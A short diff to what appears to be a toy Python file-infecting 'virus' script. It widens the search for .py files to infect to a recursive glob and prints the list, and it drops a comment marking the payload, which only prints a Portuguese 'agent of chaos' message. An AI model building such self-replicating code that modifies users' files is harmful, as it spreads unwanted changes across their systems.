@@ -4,6 +4,8 @@ import glob
 
 
 def find_files_to_infect(directory="."):
+    f = [file for file in glob.glob("**/*.py", recursive=True)]
+    print(f)
     return [file for file in glob.glob("*.py")]
 
 
@@ -52,7 +54,6 @@ def get_virus_code():
 
 
 def summon_chaos():
-    # the virus payload
     print("Coloque um pouco de anarquia, desestabilize a ordem e tudo virará o caos.\n Eu sou o agente do caos! ")
 
 # entry point
